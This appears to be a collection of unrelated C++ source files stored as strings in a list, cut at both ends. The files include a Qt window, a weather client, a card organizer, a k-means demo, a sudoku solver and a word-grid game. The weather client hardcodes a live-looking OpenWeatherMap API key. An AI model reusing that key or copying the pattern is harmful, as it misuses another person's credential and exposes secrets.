ui->soundOn_action->setShortcut(QKeySequence(Qt::CTRL + Qt::Key_E));\n    ui->soundOff_action->setIcon(QIcon(\":/icons/icons/soundOff.ico\"));\n    ui->soundOff_action->setShortcut(QKeySequence(Qt::CTRL + Qt::Key_D));\n    ui->about_action->setIcon(QIcon(\":/icons/icons/questionmark.ico\"));\n    ui->about_action->setShortcut(QKeySequence(Qt::CTRL + Qt::Key_I));\n\n    m_backgroundImage.load(\":/pictures/pictures/future.jpg\");\n    QPalette palette;\n    palette.setBrush(QPalette::Window, QBrush(m_backgroundImage.scaled(this->size(), Qt::IgnoreAspectRatio, Qt::SmoothTransformation)));\n    this->setPalette(palette);\n\n    m_pShortSound = std::make_unique<QMediaPlayer>();\n    m_pShortSound->setMedia(QUrl(\"qrc:/music/sounds/short.mp3\"));\n\n    m_pBackgroundSound = std::make_unique<QMediaPlayer>();\n    m_pBackgroundSound->setMedia(QUrl(\"qrc:/music/sounds/dendy.mp3\"));\n    m_pBackgroundSound->setVolume(30);\n    m_pBackgroundSound->play();\n}\n\n//----------------------------------------------------------------------------------------------------\n\n//\u0441\u043e\u0437\u0434\u0430\u0442\u044c \u0441\u0432\u044f\u0437\u044c \u0441\u0438\u0433\u043d\u0430\u043b\u043e\u0432 \u0438 \u0441\u043b\u043e\u0442\u043e\u0432\nvoid MainWindow::createSignalSlotConnections()\n{\n    connect(ui->soundOn_action, SIGNAL(triggered(bool)), this, SLOT(soundOn_action_clicked()));\n    connect(ui->soundOff_action, SIGNAL(triggered(bool)), this, SLOT(soundOff_action_clicked()));\n    connect(m_pBackgroundSound.get(), SIGNAL(stateChanged(QMediaPlayer::State)), this, SLOT(backgroundMusicStateChangedSlot(QMediaPlayer::State)));\n    connect(ui->about_action, SIGNAL(triggered(bool)), this, SLOT(showInfoMessageSlot()));\n}\n\n//----------------------------------------------------------------------------------------------------\n\n// \u043d\u0430\u0436\u0430\u0442\u0438\u0435 \u043d\u0430 \u043a\u043d\u043e\u043f\u043a\u0443 \"\u041e\u0422\u041a\u0420\u042b\u0422\u042c \u0412\u0422\u041e\u0420\u041e\u0415 \u041e\u041a\u041d\u041e\"\nvoid MainWindow::on_openSecondWindow_button_clicked()\n{\n    if(m_pSecondWindow)\n    {\n        delete m_pSecondWindow;\n    }\n\n    m_pSecondWindow = new SecondWindow(this);\n    connect(m_pSecondWindow, SIGNAL(closeAppSignal()), this, SLOT(closeAppSlot()));\n\n    m_pSecondWindow->show();\n}\n\n//----------------------------------------------------------------------------------------------------\n\n// \u0441\u043b\u043e\u0442, \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u044e\u0449\u0438\u0439 \u0440\u0430\u0431\u043e\u0442\u0443 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f\nvoid MainWindow::closeAppSlot()\n{\n    this->close();\n}\n\n//----------------------------------------------------------------------------------------------------\n\n//\u043d\u0430\u0436\u0430\u0442\u0438\u0435 \u043d\u0430 \u0417\u0432\u0443\u043a->\u0412\u043a\u043b.\nvoid MainWindow::soundOn_action_clicked()\n{\n    if(!m_isSoundOn)\n    {\n        m_isSoundOn = true;\n        ui->soundOn_action->setText(\"\u0412\u043a\u043b. \\u2713\");\n        ui->soundOff_action->setText(\"\u0412\u044b\u043a\u043b.\");\n        m_pBackgroundSound->play();\n    }\n}\n\n//----------------------------------------------------------------------------------------------------\n\n//\u043d\u0430\u0436\u0430\u0442\u0438\u0435 \u043d\u0430 \u0417\u0432\u0443\u043a->\u0412\u044b\u043a\u043b.\nvoid MainWindow::soundOff_action_clicked()\n{\n    if(m_isSoundOn)\n    {\n        m_isSoundOn = false;\n        ui->soundOn_action->setText(\"\u0412\u043a\u043b.\");\n        ui->soundOff_action->setText(\"\u0412\u044b\u043a\u043b. t\\u2713\");\n        m_pBackgroundSound->pause();\n    }\n}\n\n//----------------------------------------------------------------------------------------------------\n\n//\u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u044f \u0444\u043e\u043d\u043e\u0432\u043e\u0439 \u043c\u0443\u0437\u044b\u043a\u0438\nvoid MainWindow::backgroundMusicStateChangedSlot(QMediaPlayer::State state)\n{\n    //\u0431\u0435\u0441\u043a\u043e\u043d\u0435\u0447\u043d\u043e\u0435 \u0432\u043e\u0441\u043f\u0440\u043e\u0438\u0437\u0432\u0435\u0434\u0435\u043d\u0438\u0435\n    if(state == QMediaPlayer::StoppedState)\n    {\n        m_pBackgroundSound->play();\n    }\n}\n\n//----------------------------------------------------------------------------------------------------\n\n//\u043d\u0430\u0436\u0430\u0442\u0438\u0435 \"\u041e \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0435...\"\nvoid MainWindow::showInfoMessageSlot()\n{\n    QMessageBox::information(this, \"\u0422\u0435\u0441\u0442\u043e\u0432\u043e\u0435 \u0437\u0430\u0434\u0430\u043d\u0438\u0435 \u0432 \u043a\u043e\u043c\u043f\u0430\u043d\u0438\u044e \\\"\u042d\u0432\u0440\u0438\u043a\u0430\\\"\",\n                             \"\u0421\u043e\u0437\u0434\u0430\u0442\u044c \u0433\u0440\u0430\u0444\u0438\u0447\u0435\u0441\u043a\u043e\u0435 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0435 \u0441 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0430 Qt, \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0449\u0435\u0435 \u0434\u0432\u0435 \u043f\u0443\u0441\u0442\u044b\u0435 \u0444\u043e\u0440\u043c\u044b, \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0449\u0438\u0435 \u043a\u043d\u043e\u043f\u043a\u0443 \u0441\u0442\u0440\u043e\u0433\u043e \u043f\u043e \u0446\u0435\u043d\u0442\u0440\u0443:\\n \u043f\u0435\u0440\u0432\u0430\u044f \u0444\u043e\u0440\u043c\u0430 \u2013 \u0433\u043b\u0430\u0432\u043d\u043e\u0435 \u043e\u043a\u043d\u043e. \u041f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 \u043d\u0430 \u043a\u043d\u043e\u043f\u043a\u0443 \u043e\u0442\u043a\u0440\u044b\u0432\u0430\u0435\u0442\u0441\u044f \u0432\u0442\u043e\u0440\u0430\u044f \u0444\u043e\u0440\u043c\u0430.\\n \u0432\u0442\u043e\u0440\u0430\u044f \u0444\u043e\u0440\u043c\u0430 \u2013 \u0434\u0438\u0430\u043b\u043e\u0433. \u041f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 \u043d\u0430 \u043a\u043d\u043e\u043f\u043a\u0443 \u0441\u043e\u0437\u0434\u0430\u0435\u0442\u0441\u044f \u0442\u0435\u043a\u0441\u0442\u043e\u0432\u044b\u0439 \u0444\u0430\u0439\u043b, \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0449\u0438\u0439 \u0441\u0442\u0440\u043e\u043a\u0443 \u0442\u0435\u043a\u0441\u0442\u0430 \u00ab\u041c\u0438\u0440\u0443 \u043c\u0438\u0440!\u00bb \u0438 \u0437\u0430\u0432\u0435\u0440\u0448\u0430\u0435\u0442\u0441\u044f \u0440\u0430\u0431\u043e\u0442\u0430 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f.\");\n}\n\n// \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u0435 \u0440\u0430\u0437\u043c\u0435\u0440\u043e\u0432 \u0433\u043b\u0430\u0432\u043d\u043e\u0433\u043e \u043e\u043a\u043d\u0430\nvoid MainWindow:",
    "#include <iostream>\r\n#include <string>\r\n#include <cpprest/http_client.h>\r\n#include <cpprest/filestream.h>\r\n\r\nusing namespace std;\r\nusing namespace web;\r\nusing namespace web::http;\r\nusing namespace web::http::client;\r\n\r\nint main() {\r\n    cout << \"\\t +-+-+-+-+-+-+-+\" << endl;\r\n    cout << \"My weather App\" << endl;\r\n    cout << \"\\t +-+-+-+-+-+-+-+\" << endl;\r\n    cout << \"Enter City Name: \";\r\n    string city;\r\n    getline(cin, city);\r\n\r\n    http_client client(U(\"https://api.openweathermap.org/data/2.5\"));\r\n    uri_builder builder(U(\"/weather\"));\r\n    builder.append_query(U(\"q\"), utility::conversions::to_string_t(city));\r\n    builder.append_query(U(\"appid\"), U(\"746c2eed372ba85a9f8e060cbf4d3235\"));\r\n    http_request request(methods::GET);\r\n    request.set_request_uri(builder.to_string());\r\n\r\n    client.request(request).then([](http_response response) {\r\n        return response.extract_json();\r\n        }).then([](web::json::value body) {\r\n            double tempK = body[U(\"main\")][U(\"temp\")].as_double();\r\n            double tempC = tempK - 273.15; // Convert Kelvin to Celsius\r\n            cout << \"\\tTemperature: \" << tempC << \" \u00b0C\" << endl;\r\n            cout << \"\\tHumidity: \" << body[U(\"main\")][U(\"humidity\")].as_double() << \"%\" << endl;\r\n            cout << \"Weather: \" << utility::conversions::to_utf8string(body[U(\"weather\")][0][U(\"main\")].as_string()) << endl;\r\n            }).wait();\r\n\r\n        return 0;\r\n}\r\n",
    "/*\r\nORGANIZADOR DE CARTAS DE MTG\r\nAutor: Jos\u00e9 Pablo Gonzalez\r\nDescripci\u00f3n:\r\nEste c\u00f3digo va a servir para poder almacenar una lista de cartas obtenidas en un draft. \r\nSe van a tener varios objetos de drafts, y cada uno va a tener un arreglo de costes y \r\notro arreglo de cartas.\r\n\r\n*/\r\n\r\n\r\n#include <string>\r\n#include <iostream>\r\n#include <sstream> //Para el uso de Strings\r\n#include \"user.h\" //Biblioteca de usuarios de mi proyecto\r\n\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    cout << \"Bienvenido a el organizador de Drafts de MTG\" << endl;\r\n    cout << \"En este programa se va a guardar toda la infro de las cartas elegidas\" << endl;\r\n    cout << \"Dame un nombre del jugador: \" << endl;\r\n    string jugador;\r\n    cin >> jugador;\r\n    User usuario;\r\n    usuario.setNombre(jugador);\r\n    cout << \"Perfecto, ahora vamos a comenzar el primer draft:\" << endl;\r\n    \r\n    int draft_usado=0;\r\n    usuario.ComenzarDraft(draft_usado);\r\n    bool ciclo = true;\r\n    while (ciclo == true){\r\n        //Para ver \r\n        cout << \"Quieres (0) agregar una carta, (1) ver tus cartas?, (2) Salir, o (3) Crear Caso Prueba (es una deck ya hecha)? \" << endl;\r\n        int des;\r\n        cin >> des;\r\n        /*En esta primera opcion, se van a agregar cartas hasta abajo, esto\r\n        para que puedas agregar las cartas sin cambiar otras cartas.\r\n        */\r\n        if (des == 0)\r\n        {\r\n            string nombre;\r\n            int coste;\r\n            cout << \"Dame el nombre de la carta a agregar:\" << endl;\r\n            cin >> nombre;\r\n            cout << \"Dame el costo de la carta a agregar:\" << endl;\r\n            cin >> coste;\r\n            usuario.agregarCarta(draft_usado,nombre, coste);\r\n\r\n        }\r\n        /*Aqui te muestra la deck ya organizada, usando el sort explicado\r\n        antes.*/\r\n        else if (des==1)\r\n        {\r\n            usuario.mostrarDraft(draft_usado);\r\n        }\r\n        /*La ultima es para salir de la aplicacion*/\r\n        else if (des==2)\r\n        {\r\n            break;\r\n        }\r\n        else if (des==3)\r\n        {\r\n            draft_usado+=1;\r\n            usuario.casoPrueba(draft_usado);\r\n        }\r\n    }\r\n    \r\n\r\n}\r\n",
    "#include <iostream>\n#include <vector>\n#include \"algorithms/kmeans.h\"\n\nint main() {\n    // Define data points (each point is 1D in this example)\n    std::vector<std::vector<double>> data = {\n        {0.5}, {-0.3}, {0.8}, {-1.2}, {0.0}, {2.5}, {3.0}, {2.8}, {-2.0}, {1.5}\n    };\n\n    // Instantiate the KMeans class with 2 clusters\n    algorithms::KMeans kmeans(2);\n\n    // Fit the KMeans algorithm to the data\n    kmeans.fit(data);\n\n    // Retrieve cluster labels and centroids\n    std::vector<int> labels = kmeans.getLabels();\n    std::vector<std::vector<double>> centroids = kmeans.getCentroids();\n\n    // Print cluster labels for each data point\n    std::cout << \"KMeans Labels:\" << std::endl;\n    for (size_t i = 0; i < labels.size(); i++) {\n        std::cout << \"Data Point \" << i << \" is in Cluster \" << labels[i] << std::endl;\n    }\n\n    // Print the centroids of each cluster\n    std::cout << \"Cluster Centroids:\" << std::endl;\n    for (size_t i = 0; i < centroids.size(); i++) {\n        std::cout << \"Centroid \" << i << \": \" << centroids[i][0] << std::endl;\n    }\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"story_narrator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Copyright (c) 2024. made for a proof of concept for thesis: \"Automatic repair of 3D citymodels\" by Lisa Keurentjes\n\n#include <iostream>\n#include <fstream>\n#include \"InputOutput.h\"\n#include <CGAL/IO/OBJ.h>\n#include \"Defenitions.h\"\n#include \"DefenitionsVal3dity.h\"\n#include \"DefenitionsUseCase.h\"\n#include \"DefenitionsCGAL.h\"\n\nnamespace AUTOr3pair {\n    filehandler::filehandler() {\n    }\n\n\n    // -------------------------------------------------------------------------------------------------Input functions\n\n    void filehandler::set_input_file() {\n      pos = FILENAME.find_last_of(\".\") + 1;\n      string extension = FILENAME.substr(pos);\n      ranges::transform(extension, extension.begin(), ::tolower);\n      FILETYPE = extension;\n\n      string outputCombi = FILENAME.substr(0, pos - 1);\n      string citySuffix = \".city\";\n      size_t cityPos = outputCombi.rfind(citySuffix);\n      if (cityPos != string::npos) {\n        outputCombi.erase(cityPos, citySuffix.length());\n      }\n\n      if (USERINPUTFILENAME != \"\") {\n        outputCombi += \"__\";\n        size_t posI = USERINPUTFILENAME.find_last_of(\".\");\n        size_t posSlash = USERINPUTFILENAME.find_last_of(\"/\") + 1;\n        if (posI != std::string::npos && posSlash != std::string::npos) {\n          outputCombi += USERINPUTFILENAME.substr(posSlash, posI - posSlash);\n        } else if (posI != std::string::npos) {\n          outputCombi += USERINPUTFILENAME.substr(0, posI - 1);\n        } else {\n          outputCombi += USERINPUTFILENAME;\n        }\n      }\n      if (LOD != \"\"){\n        outputCombi += \"__\" + LOD;\n      }\n\n      std::cout << outputCombi << endl;\n\n      if (pos != 0 and FILENAME.find(\"/\") != pos) {\n        ReportNAME = (outputCombi + \"__RepairReport.json\");\n        OutNAME = (outputCombi + \"__REPAIRED.\" + extension);\n      } else {\n        ReportNAME = FILENAME + \"/directory_RepairReport.json\";\n        OutNAME = (outputCombi + \"__REPAIRED.\" + extension);\n      };\n      start_report();\n    }\n\n    void filehandler::start_report() {\n      RepairReport[\"input_file_type\"] = FILETYPE;\n      RepairReport[\"input_file\"] = FILENAME;\n      RepairReport[\"data_errors\"] = json::array();\n      RepairReport[\"features\"] = json::array();\n      RepairReport[\"type\"] = \"AUTOr3pairReport\";\n      RepairReport[\"version\"] = VERSION;\n      RepairReport[\"time\"] = get_time();\n    }\n\n    string filehandler::get_time() {\n      std::time_t rawtime;\n      struct tm *timeinfo;\n      std::time(&rawtime);\n      timeinfo = std::localtime(&rawtime);\n\n      char buffer[80];\n      std::strftime(buffer, 80, \"%c %Z\", timeinfo);\n      return buffer;\n    }\n\n    void filehandler::set_standards() {\n      if (USERINPUTFILENAME == \"VISUALIZATION\") {\n        STANDARDS[\"UseCaseRepair\"] = VISUALIZATION;\n        UseCase = \"VISUALIZATION\";\n      } else if (USERINPUTFILENAME == \"CFD\") {\n        STANDARDS[\"UseCaseRepair\"] = CFD;\n        UseCase = \"CFD\";\n      } else if (USERINPUTFILENAME == \"ENERGYDEMAND\") {\n        STANDARDS[\"UseCaseRepair\"] = ENERGYDEMAND;\n        UseCase = \"ENERGY DEMAND\";\n      } else if (USERINPUTFILENAME == \"SOLARPOWER\") {\n        STANDARDS[\"UseCaseRepair\"] = SOLARPOWER;\n        UseCase = \"SOLAR POWER\";\n      } else {\n        std::ifstream inputuser(USERINPUTFILENAME);\n        json input;\n        try {\n          inputuser >> input;\n          for (auto &[key, value]: STANDARDS.items()) {\n            if (value.is_object()) {\n              for (auto &[subKey, subValue]: value.items()) {\n                if (input.contains(subKey)) {\n                  STANDARDS[key][subKey] = input[subKey];\n                }\n              }\n            }\n          }\n\n          if (input.contains(\"ExtendScope\")) { STANDARDS[\"InputParameters\"][\"ExtendScope\"] = input[\"ExtendScope\"]; }\n          if (input[\"InputParameters\"].contains(\n                  \"ExtendScope\")) { STANDARDS[\"InputParameters\"][\"ExtendScope\"] = input[\"InputParameters\"][\"ExtendScope\"]; }\n\n          // for (auto it = test.begin(); it != test.end(); ++it) { STANDARDS[it.key()] = it.value(); }\n          if (STANDARDS[\"GeometryRepair\"][\"ErrorsToRepair\"].size() != 0) {\n            STANDARDS[\"GeometryRepair\"][\"SolveAll\"] = false;\n          }\n          UseCase = \"Based on input file\";\n        }\n        catch (nlohmann::detail::parse_error &e) {\n          std::cerr << \"No user input file given or not a valid JSON file. Standards will be used\" << std::endl;\n        }\n        catch (std::ios_base::failure &e) {\n          std::cerr << \"User input file given is a directory. Standards will be used\" << std::endl;\n        }\n      }\n      set_parameters();\n    }\n\n    void filehandler::set_parameters() {\n      json pm;\n      pm[\"Tollerances\"] = STANDARDS[\"Tollerances\"];\n\n      if (FILETYPE == \"obj\") { pm[\"InputParameters\"][\"OBJgeomtype\"] = STANDARDS[\"InputParameters\"][\"OBJgeomtype\"]; }\n\n      pm[\"RepairDepths\"] = STANDARDS[\"RepairDepths\"];\n\n      pm[\"GeometryRepair\"] = STANDARDS[\"GeometryRepair\"];\n      if (STANDARDS[\"GeometryRepair\"][\"SolveAll\"]) { pm[\"Ge",
    "#include \"ConnectionHandler.h\"\n#include \"vector\"\n#include \"thread\"\n\nstatic vector<string> delimitString(const char* buffer, int bufLen, char delimit) {\n\tvector<string> vRet; // Use vector<string> to store actual strings\n\tstring tempChar = \"\";\n\n\tfor (int i = 0; i < bufLen; i++) {\n\t\tif (buffer[i] != delimit) {\n\t\t\ttempChar += buffer[i]; // Append character to tempChar\n\t\t}\n\t\telse {\n\t\t\tif (!tempChar.empty()) {\n\t\t\t\tvRet.push_back(tempChar); // Store the current string in the vector\n\t\t\t\ttempChar = \"\"; // Reset tempChar for the next substring\n\t\t\t}\n\t\t}\n\t}\n\n\t// Push the last substring (if any) after the loop\n\tif (!tempChar.empty()) {\n\t\tvRet.push_back(tempChar);\n\t}\n\n\treturn vRet; // Return the vector of substrings\n}\n\nConnectionHandler::ConnectionHandler(CWizReadWriteSocket* sock,  string name)\n{\n\tsocket = sock;\n\tthis->name = name;\n}\n\nint ConnectionHandler::writeToChat(const char* message, int messageLength)\n{\n\t//Write returns the number of bytes successfully written to the connection\n\treturn socket->Write(message, messageLength);\n}\n\nint ConnectionHandler::readFromChat(char* buffer, int bufLen)\n{\n\twhile (true) {\n\t\tint iRead = 0;\n\t\twhile (iRead == 0) {\n\t\t\t//iRead = recv(socket->H(), buffer, bufLen, 0);\n\t\t\tiRead = socket->Read(buffer, bufLen, 100);\n\t\t\tSleep(50);\n\t\t}\n\t}\n\treturn 0;\n}\n\nint ConnectionHandler::readHandler() {\n\tchar inBuffer[MAX_MESSAGE_SIZE]{};\n\twhile (true) {\n\t\tint iRead = 0;\n\t\tiRead = readFromChat(inBuffer, MAX_MESSAGE_SIZE);\n\t\tif (iRead > 0) {\n\t\t\tSystem::String^ message = gcnew System::String(inBuffer);\n\t\t\tform->logMessage(message);\n\t\t}\n\t}\n}\n\nint ConnectionHandler::connectionRunner()\n{\n\tthread readThread(&ConnectionHandler::readHandler, this);\n\treadThread.detach();  // Make sure the thread runs independently\n\n\treturn 0;\n}\n\n\n\n",
    "#include <iostream>\n#include <windows.h>\n#include <vector>\n#include <string>\n#include <utility>\n#include <stack>\n#include <unordered_set>\n#include <ctime>\n\nvoid print_board(bool add=false, bool pt=true);\nvoid print_time();\nvoid process_inputs();\nbool verify(std::pair<int, int> pos);\nbool process_flags(int argc, char* argv[]);\n\nHANDLE hConsole;\nCONSOLE_CURSOR_INFO cursor_info;\n\nstd::vector<std::vector<char>> board;\nstd::vector<std::pair<int, int>> fixed;\n\nbool running = true;\nstd::pair<int, int> _pos = std::make_pair(0,0);\n\nHANDLE hInput;\n\nbool change = true;\n\nstd::stack<std::pair<int, int>> empty;\nstd::stack<std::pair<int, int>> answers;\n\nstd::time_t time_start;\n\nbool print = true;\nbool display = true;\n\nint main(int argc, char* argv[])\n{\n    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n    hInput = GetStdHandle(STD_INPUT_HANDLE);\n    GetConsoleCursorInfo(hConsole, &cursor_info);\n\n    SetConsoleMode(hConsole, ENABLE_WINDOW_INPUT | ENABLE_PROCESSED_INPUT);\n    cursor_info.bVisible = false;\n    SetConsoleCursorInfo(hConsole, &cursor_info);\n\n    board = std::vector<std::vector<char>>(9, std::vector<char>(9, '0'));\n\n    if(!process_flags(argc, argv))\n        return 0;\n\n    while(running)\n    {\n        if(change)\n        {\n            system(\"cls\");\n            print_board(false, false);\n        }\n\n        process_inputs();\n    }\n\n    time_start = std::time(nullptr);\n    \n    print_board(true);\n    print = display;\n\n    char counter = '0';\n    std::pair<int, int> pos;\n    while(!empty.empty())\n    {\n        _pos = pos = empty.top();\n\n        if(counter > '9')\n            counter = board[pos.first][pos.second];\n        else\n            counter = '0';\n\n        do\n        {\n            if(++counter > '9')\n                break;\n            \n            board[pos.first][pos.second] = counter;\n\n            if(print)\n                system(\"cls\");\n\n            print_board();\n\n        } while (!verify(pos));\n\n        if(counter <= '9')\n        {\n            answers.push(pos);\n            empty.pop();\n            \n            continue;\n        }\n\n        board[pos.first][pos.second] = '0';\n\n        if(answers.empty())\n        {\n            SetConsoleTextAttribute(hConsole, 0x4);\n            std::cout << \"[x] Failed to find the solution...\\n\";\n            SetConsoleTextAttribute(hConsole, 0xF);\n\n            return 0;\n        }\n\n        empty.push(answers.top());\n        answers.pop();\n    }\n\n    print = true;\n\n    system(\"cls\");\n    print_board();\n\n    return 0;\n}\n\nvoid print_board(bool add, bool pt)\n{\n    if(!print)\n        return;\n\n    bool c = false;\n    bool d = false;\n    char f;\n    int ptr = 0;\n\n    for(int y=0; y<9; y++)\n    {\n        for(int x=0; x<9; x++)\n        {\n            if(x == 3 || x == 6)\n                std::cout << \"| \";\n\n            c = (y == _pos.first && x == _pos.second);\n            \n            if(c)\n                SetConsoleTextAttribute(hConsole, 0xB);\n            else\n            {\n                if(ptr < fixed.size() && (y == fixed[ptr].first && x == fixed[ptr].second))\n                {\n                    SetConsoleTextAttribute(hConsole, 0x5);\n                    ++ptr;\n                    d = true;\n                }\n            }\n\n            f = board[y][x];\n            std::cout << (f == '0' ? '.' : f) << ' ';\n\n            if(add)\n            {\n                if(f == '0')\n                    empty.emplace(y,x);\n                else\n                    fixed.emplace_back(y,x);\n            }\n\n            if(c || d)\n                SetConsoleTextAttribute(hConsole, 0xF);\n        }\n\n        std::cout << '\\n';\n\n        if(y == 2 || y == 5)\n        {\n            for(int i=0; i<21; i++)\n                std::cout << '-';\n\n            std::cout << '\\n';\n        }\n    }\n\n    if(pt)\n        print_time();\n}\n\nvoid print_time()\n{\n    std::time_t t = std::time(nullptr) - time_start;\n\n    std::cout << \"\\nTime elapsed: \";\n\n    // i know it's bad, but it's not THAT bad \n    // right?\n    if(t >= 3600)\n        std::cout << t/3660 << \"h \";\n\n    if(t >= 60)\n        std::cout << (t/60)%3600 << \"m \";\n    std::cout << t%60 << \"s\";\n}\n\nvoid modif(int& c, bool i)\n{\n    change = true;\n\n    if(i)\n        ++c %= 9;\n    else\n        c = (--c < 0 ? 9 + c : c);\n}\n\nvoid process_inputs()\n{\n    DWORD events;\n    INPUT_RECORD input_record;\n\n    change = false;\n    ReadConsoleInput(hInput, &input_record, 1, &events);\n\n    if(input_record.EventType != KEY_EVENT)\n        return;\n\n    KEY_EVENT_RECORD key_event = input_record.Event.KeyEvent;\n\n    if(!key_event.bKeyDown)\n        return;\n\n\n    CHAR ascii = key_event.uChar.AsciiChar;\n    if(ascii >= '0' && ascii <= '9')\n    {\n        change = true;  \n        board[_pos.first][_pos.second] = ascii;\n        return;\n    }\n\n    if(ascii >= 32)\n    {\n        change = true;  \n        board[_pos.first][_pos.second] = '0';\n        return;\n    }\n\n    switch (key_event.wVirtualKeyCode)\n    {\n    case VK_UP:\n        modif(_pos.first, false); break;\n    case VK_DOWN:\n        modif(_pos.fi",
    "#include <bits/stdc++.h>\r\n#include \"termcolor.hpp\"\r\nusing namespace std;\r\n\r\nconst int GRID_SIZE = 7;\r\nint hintCount = 0;\r\n\r\nvector<vector<char>> AnswerGrid(GRID_SIZE, vector<char>(GRID_SIZE, ' '));\r\nvector<vector<string>> colorGrid(GRID_SIZE, vector<string>(GRID_SIZE, \"white\"));\r\nvector<vector<char>> PlayerGrid(GRID_SIZE, vector<char>(GRID_SIZE, ' '));\r\nvector<vector<string>> PlayerColorGrid(GRID_SIZE, vector<string>(GRID_SIZE, \"white\"));\r\nvector<string> words;\r\nvector<string> currentWords;\r\nmap<string, string> wordColors;\r\n\r\nvoid initGrid();\r\nvoid isValidPlacement();\r\nvoid fillGrid();\r\nvoid initPlayerGrid();\r\nvoid printGrid();\r\nvoid printPlayerGrid();\r\nbool checkWin();\r\nvoid Welcome();\r\nvoid Menu();\r\nvoid playerInput();\r\n\r\n// \u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u5355\u8bcd\r\nvector<string> fetchWords()\r\n{\r\n    vector<string> words;\r\n    ifstream file(\"5words.txt\");\r\n    string word;\r\n\r\n    // \u5148\u5c06\u6240\u6709\u5355\u8bcd\u8bfb\u5165\u5230 vector \u4e2d\r\n    while (getline(file, word))\r\n    {\r\n        words.push_back(word);\r\n    }\r\n    file.close();\r\n\r\n    // \u968f\u673a\u6253\u4e71 words \u4e2d\u7684\u5355\u8bcd\r\n    random_device rd;\r\n    mt19937 g(rd());\r\n    shuffle(words.begin(), words.end(), g);\r\n\r\n    return words;\r\n}\r\n\r\n// \u521d\u59cb\u5316\u7f51\u683c\r\nvoid initGrid()\r\n{\r\n    for (int i = 0; i < GRID_SIZE; i++)\r\n    {\r\n        for (int j = 0; j < GRID_SIZE; j++)\r\n        {\r\n            AnswerGrid[i][j] = ' ';\r\n        }\r\n    }\r\n}\r\n\r\n// \u68c0\u67e5\u5355\u8bcd\u662f\u5426\u53ef\u4ee5\u88ab\u653e\u7f6e\r\nbool isValidPlacement(const string &word, int row, int col, bool isHorizontal)\r\n{\r\n    // \u5982\u679c\u5355\u8bcd\u6c34\u5e73\uff0c\u5e76\u4e14\u957f\u5ea6\u52a0\u4e0a\u5217\u7684\u4f4d\u7f6e\u8d85\u8fc7\u7f51\u683c\u5927\u5c0f\uff0c\u5219\u4e0d\u80fd\u88ab\u653e\u7f6e\r\n    if (isHorizontal && col + word.size() > GRID_SIZE)\r\n        return false;\r\n    // \u540c\u7406\r\n    if (!isHorizontal && row + word.size() > GRID_SIZE)\r\n        return false;\r\n\r\n    for (size_t i = 0; i < word.size(); i++)\r\n    {\r\n        if (isHorizontal)\r\n        {\r\n            // \u5982\u679c\u5f53\u524d\u4f4d\u7f6e\u5df2\u6709\u5b57\u6bcd\uff0c\u5e76\u4e14\u8fd9\u4e2a\u5b57\u6bcd\u4e0d\u662f\u5f53\u524d\u5355\u8bcd\u7684\u5b57\u6bcd\uff0c\u5219\u4e0d\u80fd\u88ab\u653e\u7f6e\r\n            if (AnswerGrid[row][col + i] != ' ' && AnswerGrid[row][col + i] != word[i])\r\n                return false;\r\n        }\r\n        else\r\n        {\r\n            if (AnswerGrid[row + i][col] != ' ' && AnswerGrid[row + i][col] != word[i])\r\n                return false;\r\n        }\r\n    }\r\n    return true;\r\n}\r\n\r\n// \u586b\u5145\u7f51\u683c\r\nvoid fillGrid(const vector<string> &words)\r\n{\r\n    // \u7528\u4e0d\u540c\u7684\u989c\u8272\u586b\u5145\u5355\u8bcd\r\n    vector<string> colors = {\"red\", \"blue\", \"green\", \"yellow\", \"cyan\", \"purple\"};\r\n    int colorIndex = 0;\r\n    for (int i = 0; i < 6; i++)\r\n    {\r\n        string word = words[i];\r\n        currentWords.push_back(word);\r\n        transform(word.begin(), word.end(), word.begin(), ::tolower); // \u8f6c\u6362\u4e3a\u5c0f\u5199\r\n        bool placed = false;\r\n\r\n        // \u6700\u591a\u5c1d\u8bd51000\u6b21\uff0c\u5982\u679c1000\u6b21\u90fd\u6ca1\u6709\u627e\u5230\u5408\u9002\u7684\u4f4d\u7f6e\uff0c\u5c31\u653e\u5f03\r\n        for (int tries = 